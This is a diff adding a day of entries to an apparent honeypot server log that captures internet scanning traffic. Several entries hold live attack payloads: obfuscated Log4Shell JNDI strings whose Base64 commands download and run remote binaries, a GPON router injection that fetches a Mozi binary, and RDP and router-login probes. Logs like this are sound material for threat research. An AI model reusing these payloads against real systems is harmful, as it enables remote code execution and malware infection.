@@ -20106,3 +20106,113 @@ Mon Dec 20 2021 22:44:41 GMT+0800 (HKT) HTTP ::ffff:71.6.232.4:42752 GET / ["Hos
 
 Mon Dec 20 2021 23:15:25 GMT+0800 (HKT) HTTP ::ffff:89.39.36.96:59530 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
 
+Tue Dec 21 2021 00:10:37 GMT+0800 (HKT) HTTP ::ffff:106.75.190.116:7810 GET / ["Host","172.104.76.143:8080","Accept","*/*"]
+
+Tue Dec 21 2021 00:35:30 GMT+0800 (HKT) HTTP ::ffff:5.188.210.227:41159 GET http://5.188.210.227/echo.php ["User-Agent","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","Accept","*/*","Accept-Encoding","gzip, deflate","Pragma","no-cache","Cache-control","no-cache","Cookie","cookie=ok","Referer","https://www.google.com/","Host","5.188.210.227","Connection","close","Content-Length","0"]
+
+Tue Dec 21 2021 00:39:34 GMT+0800 (HKT) HTTP ::ffff:209.141.50.223:47340 GET /config/getuser?index=0 ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language","en-GB,en;q=0.5","Accept-Encoding","gzip, deflate","Connection","close","Upgrade-Insecure-Requests","1"]
+
+Tue Dec 21 2021 01:24:32 GMT+0800 (HKT) HTTP ::ffff:164.52.53.163:56340 GET /${jndi:ldap://185.246.87.50:1389/Exploit} ["User-Agent","Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox","Host","172.104.76.143","Cookie","test='${jndi:ldap://185.246.87.50:1389/Exploit}'"]
+
+Tue Dec 21 2021 01:24:32 GMT+0800 (HKT) HTTP ::ffff:164.52.53.163:56350 GET / ["User-Agent","${jndi:ldap://185.246.87.50:1389/Exploit}","Host","172.104.76.143"]
+
+Tue Dec 21 2021 01:24:32 GMT+0800 (HKT) HTTP ::ffff:164.52.53.163:56366 GET / ["Authorization","Basic ${jndi:ldap://185.246.87.50:1389/Exploit}","User-Agent","curl/7.58.0","Accept","*/*","Host","172.104.76.143"]
+
+Tue Dec 21 2021 03:49:50 GMT+0800 (HKT) HTTP ::ffff:209.141.50.223:59462 GET /config/getuser?index=0 ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language","en-GB,en;q=0.5","Accept-Encoding","gzip, deflate","Connection","close","Upgrade-Insecure-Requests","1"]
+
+Tue Dec 21 2021 04:11:15 GMT+0800 (HKT) TCP new client ::ffff:94.232.42.126:63846
+Tue Dec 21 2021 04:11:15 GMT+0800 (HKT) TCP ::ffff:94.232.42.126:63846 client data str   /*�     Cookie: mstshash=Administr
+     
+Tue Dec 21 2021 04:11:15 GMT+0800 (HKT) TCP ::ffff:94.232.42.126:63846 client data buf 0300002f2ae00000000000436f6f6b69653a206d737473686173683d41646d696e697374720d0a0100080003000000
+Tue Dec 21 2021 04:15:39 GMT+0800 (HKT) HTTP ::ffff:195.54.160.149:47522 GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNzIuMTA0Ljc2LjE0Mzo4MDgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE3Mi4xMDQuNzYuMTQzOjgwODApfGJhc2g=} ["Host","172.104.76.143:8080","User-Agent","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNzIuMTA0Ljc2LjE0Mzo4MDgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE3Mi4xMDQuNzYuMTQzOjgwODApfGJhc2g=}","Referer","${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNzIuMTA0Ljc2LjE0Mzo4MDgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE3Mi4xMDQuNzYuMTQzOjgwODApfGJhc2g=}","Accept-Encoding","gzip","Connection","close"]
+
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 13042 died
+Worker 19614 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Tue Dec 21 2021 05:26:41 GMT+0800 (HKT) HTTP ::ffff:192.241.211.137:55784 GET /actuator/health ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 06:31:10 GMT+0800 (HKT) HTTP ::ffff:46.174.191.31:38364 GET / ["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","Accept","*/*"]
+
+Tue Dec 21 2021 06:40:14 GMT+0800 (HKT) HTTP ::ffff:150.158.95.54:43678 GET /${jndi:ldap://185.246.87.50:1389/Exploit} ["User-Agent","Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox","Host","172.104.76.143","Cookie","test='${jndi:ldap://185.246.87.50:1389/Exploit}'"]
+
+Tue Dec 21 2021 06:40:14 GMT+0800 (HKT) HTTP ::ffff:150.158.95.54:43736 GET / ["User-Agent","${jndi:ldap://185.246.87.50:1389/Exploit}","Host","172.104.76.143"]
+
+Tue Dec 21 2021 06:40:15 GMT+0800 (HKT) HTTP ::ffff:150.158.95.54:43790 GET / ["Authorization","Basic ${jndi:ldap://185.246.87.50:1389/Exploit}","User-Agent","curl/7.58.0","Accept","*/*","Host","172.104.76.143"]
+
+Tue Dec 21 2021 06:53:36 GMT+0800 (HKT) HTTP ::ffff:196.196.41.68:39090 GET / ["Host","172.104.76.143:8080"]
+
+Tue Dec 21 2021 07:03:32 GMT+0800 (HKT) HTTP ::ffff:209.141.48.248:60774 GET /script ["Host","","Connection","close","User_Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"]
+
+Tue Dec 21 2021 08:43:25 GMT+0800 (HKT) HTTP ::ffff:43.131.23.41:43522 GET / ["Host","172.104.76.143:8080","Connection","close"]
+
+Tue Dec 21 2021 09:13:08 GMT+0800 (HKT) HTTP ::ffff:128.1.248.26:42744 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 09:49:56 GMT+0800 (HKT) HTTP ::ffff:180.188.232.148:57960 GET /boaform/admin/formLogin?username=adminisp&psd=adminisp []
+
+Tue Dec 21 2021 10:17:22 GMT+0800 (HKT) HTTP ::ffff:178.174.137.95:55320 GET / []
+
+Tue Dec 21 2021 11:02:49 GMT+0800 (HKT) HTTP ::ffff:92.118.161.37:52839 GET / ["User-Agent","NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com","Accept","*/*"]
+
+Tue Dec 21 2021 12:02:58 GMT+0800 (HKT) HTTP ::ffff:23.251.102.90:37504 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 13:31:15 GMT+0800 (HKT) HTTP ::ffff:162.142.125.57:39506 GET / ["Host","172.104.76.143:8080"]
+
+Tue Dec 21 2021 13:31:15 GMT+0800 (HKT) HTTP ::ffff:162.142.125.57:35306 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 15:23:43 GMT+0800 (HKT) HTTP ::ffff:128.1.248.26:50984 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 15:36:47 GMT+0800 (HKT) HTTP ::ffff:195.54.160.149:51002 GET /securityRealm/user/admin/search/index?q=a ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36","Accept-Encoding","gzip","Connection","close"]
+
+Tue Dec 21 2021 15:36:55 GMT+0800 (HKT) HTTP ::ffff:45.137.23.232:46246 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 15:39:54 GMT+0800 (HKT) HTTP ::ffff:184.105.247.254:43250 GET / ["Host","172.104.76.143"]
+
+Tue Dec 21 2021 15:43:48 GMT+0800 (HKT) HTTP ::ffff:195.54.160.149:45416 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36","Accept-Encoding","gzip","Connection","close"]
+
+Tue Dec 21 2021 15:43:50 GMT+0800 (HKT) HTTP ::ffff:147.182.202.30:58134 GET / ["X-Api-Version","${jnd${123%25ff:-${123%25ff:-i:}}ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9ydW47IGN1cmwgLU8gaHR0cDovLzE1Mi42Ny42My4xNTAvcnVuOyBjaG1vZCA3NzcgcnVuOyAuL3J1biByY2UueDg2}","User-Agent","${jnd${123%25ff:-${123%25ff:-i:}}ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9ydW47IGN1cmwgLU8gaHR0cDovLzE1Mi42Ny42My4xNTAvcnVuOyBjaG1vZCA3NzcgcnVuOyAuL3J1biByY2UueDg2}","Referer","${jnd${123%25ff:-${123%25ff:-i:}}ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9ydW47IGN1cmwgLU8gaHR0cDovLzE1Mi42Ny42My4xNTAvcnVuOyBjaG1vZCA3NzcgcnVuOyAuL3J1biByY2UueDg2}","Cookie","${jnd${123%25ff:-${123%25ff:-i:}}ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9ydW47IGN1cmwgLU8gaHR0cDovLzE1Mi42Ny42My4xNTAvcnVuOyBjaG1vZCA3NzcgcnVuOyAuL3J1biByY2UueDg2}","host","172.104.76.143:8080","Connection","close"]
+
+Tue Dec 21 2021 15:53:44 GMT+0800 (HKT) HTTP ::ffff:192.241.215.83:46684 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 15:55:12 GMT+0800 (HKT) HTTP ::ffff:103.203.57.9:45022 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0","Accept-Encoding","gzip","Connection","close"]
+
+Tue Dec 21 2021 16:55:46 GMT+0800 (HKT) HTTP ::ffff:146.255.81.98:54262 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
+
+Tue Dec 21 2021 19:21:59 GMT+0800 (HKT) HTTP ::ffff:193.118.53.210:37852 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Dec 21 2021 19:25:57 GMT+0800 (HKT) HTTP undefined:undefined POST /GponForm/diag_Form?images/ ["Host","127.0.0.1:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","Hello, World","Content-Length","118"]
+58576562506167654e616d653d6469616726646961675f616374696f6e3d70696e672677616e5f636f6e6c6973743d3026646573745f686f73743d60603b776765742b687474703a2f2f35392e39362e3234362e3133323a33333934332f4d6f7a692e6d2b2d4f2b2d3e2f746d702f67706f6e383038
+Tue Dec 21 2021 19:34:25 GMT+0800 (HKT) TCP new client ::ffff:89.248.165.50:64128
+Tue Dec 21 2021 19:34:25 GMT+0800 (HKT) TCP ::ffff:89.248.165.50:64128 client data str   /*�     Cookie: mstshash=Administr
+     
+Tue Dec 21 2021 19:34:25 GMT+0800 (HKT) TCP ::ffff:89.248.165.50:64128 client data buf 0300002f2ae00000000000436f6f6b69653a206d737473686173683d41646d696e697374720d0a0100080003000000
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 19614 died
+Worker 22166 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Tue Dec 21 2021 20:41:51 GMT+0800 (HKT) HTTP ::ffff:176.240.73.41:52857 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Dec 21 2021 21:16:37 GMT+0800 (HKT) HTTP ::ffff:147.182.202.30:57340 GET / ["X-Api-Version","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","User-Agent","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","Referer","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","Cookie","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","host","172.104.76.143:8080","Connection","close"]
+
+Tue Dec 21 2021 21:56:04 GMT+0800 (HKT) HTTP ::ffff:147.182.202.30:37208 GET / ["X-Api-Version","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","User-Agent","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","Referer","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","Cookie","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')","host","172.104.76.143:8080","Connection","close"]
+
+Tue Dec 21 2021 23:31:32 GMT+0800 (HKT) HTTP ::ffff:209.141.50.223:60468 GET /config/getuser?index=0 ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language","en-GB,en;q=0.5","Accept-Encoding","gzip, deflate","Connection","close","Upgrade-Insecure-Requests","1"]
+
+Tue Dec 21 2021 23:46:32 GMT+0800 (HKT) HTTP ::ffff:104.206.128.38:58555 GET / ["Host","172.104.76.143:8080","User-Agent","https://gdnplus.com:Gather Analyze Provide."]
+
